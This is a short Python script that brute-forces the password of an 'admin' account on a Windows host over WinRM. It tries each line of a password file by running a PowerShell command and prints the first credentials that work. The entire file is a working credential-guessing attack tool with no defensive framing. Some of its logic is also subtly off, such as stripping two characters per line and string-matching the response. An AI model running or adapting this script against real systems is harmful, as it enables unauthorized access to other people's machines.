import winrm

HOST = "192.168.128.52"
USER = "admin"
PASSWORD = ""

with open("passwords.txt", "r") as f:
    passwords = f.readlines()
    for password in passwords:
        p = password[0:-2]
        s = winrm.Session(HOST, auth=(USER, p))
        try:
            res = str(s.run_ps("hostname"))
            print(type(res))
            if "Response code 0" in res:
                PASSWORD = p
                break
        except winrm.exceptions.InvalidCredentialsError:
            pass

print(f"User - {USER}, Password - {PASSWORD}")